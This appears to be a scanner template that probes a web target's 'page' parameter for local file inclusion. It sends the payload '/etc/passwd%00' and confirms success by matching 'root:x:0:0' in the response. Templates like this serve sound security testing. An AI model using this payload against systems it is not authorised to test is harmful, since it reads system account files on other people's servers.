id: lfi-019
name: 'Path traversal via page'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads /etc/passwd via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - '/etc/passwd%00'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
